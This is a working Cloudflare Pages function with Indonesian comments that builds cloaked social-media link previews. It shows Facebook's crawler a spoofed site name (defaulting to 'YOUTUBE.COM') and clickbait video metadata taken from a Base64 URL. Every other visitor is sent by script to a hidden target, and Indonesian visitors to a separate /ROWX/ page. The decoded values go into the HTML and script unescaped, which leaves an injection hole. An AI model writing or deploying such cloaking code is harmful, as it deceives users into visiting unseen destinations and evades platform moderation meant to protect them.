export async function onRequest(context) {
  const url = new URL(context.request.url);
  const pathParts = url.pathname.split('/').filter(p => p);

  // Jika tidak ada data atau akses folder ROWX secara manual, biarkan Cloudflare handle file statis
  if (pathParts.length < 1 || pathParts[0] === 'ROWX') {
    return context.next(); 
  }

  try {
    // Ambil string Base64 dari URL
    let base64Data = pathParts[0];
    
    // Fix: Mengembalikan karakter yang mungkin hilang saat proses copy-paste
    base64Data = base64Data.replace(/-/g, '+').replace(/_/g, '/');
    
    // Dekode Base64 secara aman (UTF-8 support)
    const decodedData = decodeURIComponent(escape(atob(base64Data)));
    const parts = decodedData.split('|||'); 

    const title  = parts[0] || "Video Viral";
    const domain = parts[1] || "YOUTUBE.COM";
    const desc   = parts[2] || "Klik untuk menonton...";
    const image  = parts[3] || "";
    const target = parts[4] || "https://google.com";

    // Logika Redirect Negara (Indonesia ke /ROWX/)
    const country = context.request.cf.country;
    let finalRedirect = target;

    if (country === "ID") {
      const baseUrl = url.origin;
      finalRedirect = baseUrl + "/ROWX/"; 
    }

    return new Response(`
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <title>${title}</title>
        <meta property="fb:app_id" content="966242223397117">
        <meta property="og:url" content="${url.href}">
        <meta property="og:site_name" content="${domain}">
        <meta property="og:title" content="${title}">
        <meta property="og:description" content="${desc}">
        <meta property="og:image" content="${image}">
        <meta property="og:type" content="video.other">
        <meta property="og:video:url" content="${url.href}">
        <meta property="og:video:type" content="text/html">
        <script>
          if (!navigator.userAgent.includes('facebookexternalhit')) {
            window.location.href = "${finalRedirect}";
          }
        </script>
      </head>
      <body style="background:#000;color:#fff;">Redirecting...</body>
      </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });

  } catch (e) {
    // Jika Base64 rusak atau error, jangan tampilkan 1101, lempar ke Google
    return Response.redirect("https://google.com", 302);
  }
}
